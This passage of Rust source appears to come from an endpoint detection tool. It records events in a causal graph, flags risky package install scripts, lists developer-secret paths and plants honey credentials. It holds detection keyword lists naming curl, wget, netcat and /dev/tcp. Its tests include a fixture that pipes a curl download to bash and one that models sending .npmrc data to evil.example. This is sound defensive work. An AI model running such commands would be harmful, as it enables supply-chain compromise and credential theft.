                insert_json(&mut attributes, "name", name);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Credential,
                        format!("credential:{key}"),
                        key,
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::AccessedCredential,
                ))
            }
            EndpointEvent::ToolCall {
                tool_name,
                parameters,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "parameters", parameters);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Tool,
                        format!("tool:{tool_name}"),
                        tool_name.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Related,
                ))
            }
            EndpointEvent::PolicyDecision {
                action,
                target,
                decision,
                guard,
                severity,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "target", target);
                insert_json(&mut attributes, "decision", decision);
                insert_json(&mut attributes, "guard", guard);
                insert_json(&mut attributes, "severity", severity);
                Some((
                    self.ensure_node(
                        CausalNodeKind::PolicyDecision,
                        format!(
                            "decision:{}:{}:{}",
                            action,
                            target.as_deref().unwrap_or_default(),
                            decision
                        ),
                        format!("{action} {decision}"),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::MadeDecision,
                ))
            }
            EndpointEvent::Other { category, fields } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "fields", fields);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Other,
                        format!("other:{category}:{}", observation.observation_id),
                        category.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Related,
                ))
            }
        }
    }

    fn add_temporal_edge(&mut self, observation: &EndpointObservation, node_id: &str) {
        let Some(session_id) = observation.session_id.as_deref() else {
            return;
        };
        if let Some(previous) = self.last_node_by_session.get(session_id).cloned() {
            if previous != node_id {
                self.add_edge(
                    previous,
                    node_id.to_string(),
                    CausalEdgeKind::TemporalNext,
                    observation,
                    BTreeMap::new(),
                );
            }
        }
        self.last_node_by_session
            .insert(session_id.to_string(), node_id.to_string());
    }

    fn ensure_node(
        &mut self,
        kind: CausalNodeKind,
        key: String,
        label: String,
        timestamp: DateTime<Utc>,
        attributes: BTreeMap<String, serde_json::Value>,
    ) -> String {
        let node_id = stable_id("node", [key.as_str()]);
        if let Some(existing) = self.graph.nodes.get_mut(&node_id) {
            existing.last_seen = timestamp;
            for (key, value) in attributes {
                existing.attributes.entry(key).or_insert(value);
            }
            return node_id;
        }

        self.graph.nodes.insert(
            node_id.clone(),
            CausalNode {
                node_id: node_id.clone(),
                kind,
                label,
                first_seen: timestamp,
                last_seen: timestamp,
                attributes,
            },
        );
        node_id
    }

    fn touch_node(&mut self, node_id: &str, timestamp: DateTime<Utc>) {
        if let Some(node) = self.graph.nodes.get_mut(node_id) {
            node.last_seen = timestamp;
        }
    }

    fn add_edge(
        &mut self,
        from: String,
        to: String,
        kind: CausalEdgeKind,
        observation: &EndpointObservation,
        attributes: BTreeMap<String, serde_json::Value>,
    ) {
        let kind_key = format!("{kind:?}");
        let edge_id = stable_id(
            "edge",
            [
                from.as_str(),
                to.as_str(),
                kind_key.as_str(),
                observation.observation_id.as_str(),
            ],
        );
        if self.graph.edges.iter().any(|edge| edge.edge_id == edge_id) {
            return;
        }
        self.graph.edges.push(CausalEdge {
            edge_id,
            from,
            to,
            kind,
            timestamp: observation.timestamp,
            observation_id: observation.observation_id.clone(),
            attributes,
        });
    }
}

fn endpoint_event_from_policy_event(event: &PolicyEvent) -> EndpointEvent {
    match (&event.event_type, &event.data) {
        (
            PolicyEventType::FileRead | PolicyEventType::FileWrite,
            PolicyEventData::File(FileEventData {
                path,
                operation,
                content,
                ..
            }),
        ) => EndpointEvent::FileAccess {
            operation: FileOperation::from_policy_operation(
                operation.as_deref(),
                &event.event_type,
            ),
            path: path.clone(),
            source_url: None,
            content_preview: content.clone(),
        },
        (
            PolicyEventType::NetworkEgress,
            PolicyEventData::Network(NetworkEventData {
                host,
                port,
                protocol,
                url,
            }),
        ) => EndpointEvent::NetworkFlow {
            host: host.clone(),
            port: *port,
            protocol: protocol.clone(),
            url: url.clone(),
        },
        (PolicyEventType::CommandExec, PolicyEventData::Command(command)) => {
            EndpointEvent::ProcessExec {
                image: command.command.clone(),
                args: command.args.clone(),
                env: BTreeMap::new(),
            }
        }
        (PolicyEventType::ToolCall, PolicyEventData::Tool(tool)) => EndpointEvent::ToolCall {
            tool_name: tool.tool_name.clone(),
            parameters: tool.parameters.clone(),
        },
        (PolicyEventType::SecretAccess, PolicyEventData::Secret(secret)) => {
            EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other(secret.scope.clone()),
                path: None,
                name: Some(secret.secret_name.clone()),
            }
        }
        (PolicyEventType::Custom, PolicyEventData::Custom(custom)) => EndpointEvent::Other {
            category: custom.custom_type.clone(),
            fields: custom.extra.clone().into_iter().collect(),
        },
        _ => EndpointEvent::Other {
            category: event.event_type.as_str().to_string(),
            fields: BTreeMap::new(),
        },
    }
}

fn metadata_as_btree(metadata: Option<&serde_json::Value>) -> BTreeMap<String, serde_json::Value> {
    let Some(serde_json::Value::Object(obj)) = metadata else {
        return BTreeMap::new();
    };
    obj.iter()
        .map(|(key, value)| (key.clone(), value.clone()))
        .collect()
}

fn process_from_metadata(metadata: &BTreeMap<String, serde_json::Value>) -> EndpointProcess {
    let process_obj = metadata
        .get("process")
        .and_then(serde_json::Value::as_object);
    EndpointProcess {
        pid: u32_field(metadata, process_obj, &["pid", "processId", "process_id"]),
        ppid: u32_field(metadata, process_obj, &["ppid", "parentPid", "parent_pid"]),
        process_guid: string_field_nested(
            metadata,
            process_obj,
            &["processGuid", "process_guid", "entityId", "entity_id"],
        ),
        parent_process_guid: string_field_nested(
            metadata,
            process_obj,
            &["parentProcessGuid", "parent_process_guid", "parentEntityId"],
        ),
        image: string_field_nested(metadata, process_obj, &["image", "processImage", "path"]),
        command_line: string_field_nested(
            metadata,
            process_obj,
            &["commandLine", "command_line", "cmdline"],
        ),
        cwd: string_field_nested(metadata, process_obj, &["cwd", "workingDirectory"]),
        signing: metadata
            .get("signing")
            .or_else(|| process_obj.and_then(|obj| obj.get("signing")))
            .and_then(|value| serde_json::from_value(value.clone()).ok())
            .unwrap_or_default(),
    }
}

fn u32_field(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<u32> {
    for key in keys {
        let value = nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key));
        match value {
            Some(serde_json::Value::Number(number)) => {
                if let Some(value) = number.as_u64().and_then(|value| u32::try_from(value).ok()) {
                    return Some(value);
                }
            }
            Some(serde_json::Value::String(value)) => {
                if let Ok(parsed) = value.parse::<u32>() {
                    return Some(parsed);
                }
            }
            _ => {}
        }
    }
    None
}

fn string_field(metadata: &BTreeMap<String, serde_json::Value>, keys: &[&str]) -> Option<String> {
    keys.iter().find_map(|key| {
        metadata
            .get(*key)
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

fn string_field_nested(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<String> {
    keys.iter().find_map(|key| {
        nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key))
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

struct FindingRule<'a> {
    rule_id: &'a str,
    title: &'a str,
    severity: DetectionSeverity,
    confidence: f32,
    description: &'a str,
    mitre_attack: Vec<&'a str>,
    tags: Vec<&'a str>,
    remediation: &'a str,
}

fn finding(
    observation: &EndpointObservation,
    evidence: Vec<DetectionEvidence>,
    rule: FindingRule<'_>,
) -> DetectionFinding {
    DetectionFinding {
        finding_id: stable_id(
            "finding",
            [rule.rule_id, observation.observation_id.as_str()],
        ),
        rule_id: rule.rule_id.to_string(),
        title: rule.title.to_string(),
        severity: rule.severity,
        confidence: rule.confidence,
        description: rule.description.to_string(),
        observation_id: observation.observation_id.clone(),
        timestamp: observation.timestamp,
        evidence,
        mitre_attack: rule
            .mitre_attack
            .into_iter()
            .map(ToString::to_string)
            .collect(),
        tags: rule.tags.into_iter().map(ToString::to_string).collect(),
        remediation: rule.remediation.to_string(),
    }
}

fn ev(key: impl Into<String>, value: impl Into<String>) -> DetectionEvidence {
    DetectionEvidence {
        key: key.into(),
        value: value.into(),
    }
}

fn opt_ev(key: impl Into<String>, value: Option<&str>) -> Option<DetectionEvidence> {
    value.map(|value| ev(key, value))
}

fn is_install_phase(phase: &str) -> bool {
    let phase = phase.to_ascii_lowercase();
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "build",
        "build.rs",
        "setup.py",
    ]
    .iter()
    .any(|needle| phase.contains(needle))
}

fn suspicious_script_reason(script: &str) -> Option<&'static str> {
    let script = script.to_ascii_lowercase();
    [
        ("curl ", "downloads remote payloads with curl"),
        ("wget ", "downloads remote payloads with wget"),
        ("bash -c", "executes an inline shell"),
        ("sh -c", "executes an inline shell"),
        ("base64", "decodes or hides payload material"),
        ("openssl enc", "decrypts embedded payload material"),
        ("osascript", "uses AppleScript automation"),
        ("launchctl", "modifies launch services"),
        ("crontab", "modifies cron persistence"),
        ("chmod +x", "makes a downloaded file executable"),
        ("mkfifo", "creates shell transport primitives"),
        ("/dev/tcp", "uses shell TCP redirection"),
        ("nc ", "uses netcat"),
        ("netcat", "uses netcat"),
        ("eval ", "evaluates generated code"),
        ("python -c", "executes inline Python"),
        ("ruby -e", "executes inline Ruby"),
        ("perl -e", "executes inline Perl"),
    ]
    .into_iter()
    .find_map(|(needle, reason)| script.contains(needle).then_some(reason))
}

fn path_is_user_writable_or_download(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.starts_with("/tmp/")
        || path.starts_with("/private/tmp/")
        || path.starts_with("/var/folders/")
        || path.contains("/Downloads/")
        || path.contains("/Library/Caches/")
        || path.contains("/.cache/")
        || path.contains("/node_modules/.bin/")
        || path.contains("/target/debug/")
        || path.contains("/target/release/")
}

fn path_is_launch_persistence(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Library/LaunchAgents/")
        || path.contains("/Library/LaunchDaemons/")
        || path.contains("/System/Library/LaunchAgents/")
        || path.contains("/System/Library/LaunchDaemons/")
}

fn path_looks_like_browser_extension(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Extensions/") || path.contains("/Browser Extensions/")
}

fn path_looks_like_developer_secret(path: &str) -> bool {
    let path = normalize_path_string(path);
    [
        "/.ssh/",
        "/.aws/",
        "/.config/gcloud/",
        "/.azure/",
        "/.npmrc",
        "/.pypirc",
        "/.cargo/credentials",
        "/.docker/config.json",
        "id_rsa",
        "id_ed25519",
        "Cookies",
        "Local State",
    ]
    .iter()
    .any(|needle| path.contains(needle))
}

fn command_looks_like_package_manager(image: &str, args: &[String]) -> bool {
    let image = image.to_ascii_lowercase();
    let args = args.join(" ").to_ascii_lowercase();
    [
        "npm", "pnpm", "yarn", "pip", "pip3", "cargo", "brew", "go", "gem", "bundle",
    ]
    .iter()
    .any(|name| image.ends_with(name) || image.contains(&format!("/{name}")))
        || args.contains(" npm ")
        || args.contains(" pip ")
        || args.contains(" cargo ")
}

fn observed_path(observation: &EndpointObservation) -> Option<&str> {
    match &observation.event {
        EndpointEvent::FileAccess { path, .. }
        | EndpointEvent::DylibLoad { path, .. }
        | EndpointEvent::LaunchPersistence { path, .. }
        | EndpointEvent::BrowserExtensionInstall { path, .. }
        | EndpointEvent::BrowserDownload { path, .. } => Some(path),
        EndpointEvent::CredentialAccess { path, .. } => path.as_deref(),
        _ => None,
    }
}

fn observation_contains_marker(observation: &EndpointObservation, marker: &str) -> bool {
    if marker.is_empty() {
        return false;
    }
    match &observation.event {
        EndpointEvent::FileAccess {
            content_preview: Some(content),
            ..
        } => content.contains(marker),
        _ => serde_json::to_string(&observation.metadata)
            .map(|value| value.contains(marker))
            .unwrap_or(false),
    }
}

fn honey_artifact(
    endpoint_id: &str,
    kind: HoneyArtifactKind,
    relative_path: &str,
) -> HoneyArtifact {
    let artifact_id = stable_id("honey", [endpoint_id, kind.as_str(), relative_path]);
    let marker = format!("clawdstrike-honey-{artifact_id}");
    let contents = honey_contents(&kind, endpoint_id, &marker);
    HoneyArtifact {
        artifact_id,
        kind,
        relative_path: PathBuf::from(relative_path),
        marker,
        contents,
        permissions_octal: 0o600,
        tags: vec!["deception".to_string(), "endpoint".to_string()],
    }
}

fn honey_contents(kind: &HoneyArtifactKind, endpoint_id: &str, marker: &str) -> String {
    match kind {
        HoneyArtifactKind::SshPrivateKey => format!(
            "# honey ssh key for endpoint {endpoint_id}\n# marker: {marker}\n-----BEGIN OPENSSH PRIVATE KEY-----\n{marker}\n-----END OPENSSH PRIVATE KEY-----\n"
        ),
        HoneyArtifactKind::ApiTokenFile => {
            format!("CLAWDSTRIKE_PROD_API_TOKEN=cs_live_{marker}\n")
        }
        HoneyArtifactKind::CloudCredentials => format!(
            "[prod]\naws_access_key_id = AKIA{marker}\naws_secret_access_key = {marker}\naws_session_token = {marker}\n"
        ),
        HoneyArtifactKind::PackageRegistryToken => {
            format!("//registry.npmjs.org/:_authToken=npm_{marker}\n")
        }
        HoneyArtifactKind::BrowserCookieJar => format!(
            "{{\"cookies\":[{{\"domain\":\"intranet.invalid\",\"name\":\"session\",\"value\":\"{marker}\"}}]}}\n"
        ),
        HoneyArtifactKind::InternalHostname => {
            format!("prod-admin-{endpoint_id}.corp.invalid # {marker}\n")
        }
    }
}

fn ensure_safe_relative_path(path: &Path) -> Result<()> {
    if path.is_absolute() {
        return Err(anyhow!(
            "honey artifact path must be relative: {}",
            path.display()
        ));
    }
    for component in path.components() {
        if matches!(
            component,
            Component::ParentDir | Component::RootDir | Component::Prefix(_)
        ) {
            return Err(anyhow!(
                "honey artifact path contains unsafe component: {}",
                path.display()
            ));
        }
    }
    Ok(())
}

fn create_new_honey_file(path: &Path, artifact: &HoneyArtifact) -> std::io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(artifact.contents.as_bytes())?;
    set_file_permissions(path, artifact.permissions_octal)
}

#[cfg(unix)]
fn set_file_permissions(path: &Path, permissions_octal: u32) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;

    fs::set_permissions(path, fs::Permissions::from_mode(permissions_octal))
}

#[cfg(not(unix))]
fn set_file_permissions(_path: &Path, _permissions_octal: u32) -> std::io::Result<()> {
    Ok(())
}

fn normalize_path_string(path: &str) -> String {
    let replaced = path.replace('\\', "/");
    let is_absolute = replaced.starts_with('/');
    let normalized = replaced
        .split('/')
        .filter(|part| !part.is_empty() && *part != ".")
        .collect::<Vec<_>>()
        .join("/");

    if is_absolute {
        format!("/{normalized}")
    } else {
        normalized
    }
}

fn stable_id<'a>(prefix: &str, parts: impl IntoIterator<Item = &'a str>) -> String {
    let mut hash = FNV_OFFSET;
    for part in parts {
        for byte in part.as_bytes() {
            hash ^= u64::from(*byte);
            hash = hash.wrapping_mul(FNV_PRIME);
        }
        hash ^= 0xff;
        hash = hash.wrapping_mul(FNV_PRIME);
    }
    format!("{prefix}:{hash:016x}")
}

fn insert_json<T: Serialize>(map: &mut BTreeMap<String, serde_json::Value>, key: &str, value: T) {
    if let Ok(value) = serde_json::to_value(value) {
        if !value.is_null() {
            map.insert(key.to_string(), value);
        }
    }
}

fn reconstruct_path(from: &str, to: &str, previous: &BTreeMap<String, String>) -> Vec<String> {
    let mut path = vec![to.to_string()];
    let mut cursor = to;
    while let Some(prev) = previous.get(cursor) {
        path.push(prev.clone());
        if prev == from {
            break;
        }
        cursor = prev;
    }
    path.reverse();
    path
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used, clippy::unwrap_used)]

    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    fn observation(event: EndpointEvent) -> EndpointObservation {
        EndpointObservation {
            observation_id: stable_id("test", ["obs", event_name(&event)]),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            user_id: Some("alice".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                process_guid: Some("proc-42".to_string()),
                image: Some("/usr/bin/npm".to_string()),
                command_line: Some("npm install".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Notarized,
                    notarized: Some(true),
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event,
            metadata: BTreeMap::new(),
        }
    }

    fn event_name(event: &EndpointEvent) -> &'static str {
        match event {
            EndpointEvent::PackageScript { .. } => "script",
            EndpointEvent::ProcessExec { .. } => "exec",
            EndpointEvent::FileAccess { .. } => "file",
            EndpointEvent::NetworkFlow { .. } => "network",
            EndpointEvent::CredentialAccess { .. } => "credential",
            _ => "other",
        }
    }

    #[test]
    fn supply_chain_guard_flags_risky_npm_postinstall_script() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.install_script.risky");
        assert_eq!(findings[0].severity, DetectionSeverity::High);
        assert!(findings[0].mitre_attack.contains(&"T1195.002".to_string()));
    }

    #[test]
    fn supply_chain_guard_flags_unsigned_downloaded_binary() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut event = observation(EndpointEvent::ProcessExec {
            image: "/Users/alice/Downloads/build-helper".to_string(),
            args: vec!["--postinstall".to_string()],
            env: BTreeMap::new(),
        });
        event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Unsigned,
            notarized: Some(false),
            ..CodeSignatureStatus::default()
        };

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.unsigned_binary.dev_path");
    }

    #[test]
    fn deception_plan_materializes_without_overwriting_and_detects_access() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");

        let first = plan.materialize().unwrap();
        let second = plan.materialize().unwrap();

        assert_eq!(first.created.len(), plan.artifacts.len());
        assert_eq!(second.skipped.len(), plan.artifacts.len());

        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::SshPrivateKey)
            .unwrap();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: artifact.absolute_path(&root).display().to_string(),
            source_url: None,
            content_preview: None,
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn causal_graph_links_process_to_file_secret_and_network() {
        let mut recorder = CausalGraphRecorder::new();

        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-1".to_string();

        let file_nodes = recorder.record_observation(&file);
        let network_nodes = recorder.record_observation(&network);
        let graph = recorder.graph();

        assert!(graph.nodes.len() >= 3);
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Read));
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));

        let file_node = file_nodes.last().unwrap();
        let network_node = network_nodes.last().unwrap();
        let path = recorder.causal_path(file_node, network_node).unwrap();
        assert_eq!(path.first().unwrap(), file_node);
        assert_eq!(path.last().unwrap(), network_node);
    }

    #[test]
    fn policy_event_converts_to_endpoint_observation() {
        let event = PolicyEvent {
            event_id: "policy-1".to_string(),
            event_type: PolicyEventType::NetworkEgress,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Network(NetworkEventData {
                host: "api.example.com".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.com/v1".to_string()),
            }),
            metadata: Some(serde_json::json!({
                "process": {
                    "pid": 9,
                    "image": "/usr/bin/python3",
                    "commandLine": "python3 script.py"
                }
            })),
            context: None,
        };

        let observation = EndpointObservation::from_policy_event(&event);

        assert_eq!(observation.observation_id, "policy-1");
        assert_eq!(observation.process.pid, Some(9));
        match observation.event {
            EndpointEvent::NetworkFlow { host, port, .. } => {
                assert_eq!(host, "api.example.com");
                assert_eq!(port, 443);
            }
            other => panic!("unexpected event: {other:?}"),
        }
    }

    fn temp_root() -> PathBuf {
        let millis = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        std::env::temp_dir().join(format!(
            "clawdstrike-edr-test-{}-{millis}",
            std::process::id()
        ))
    }
}
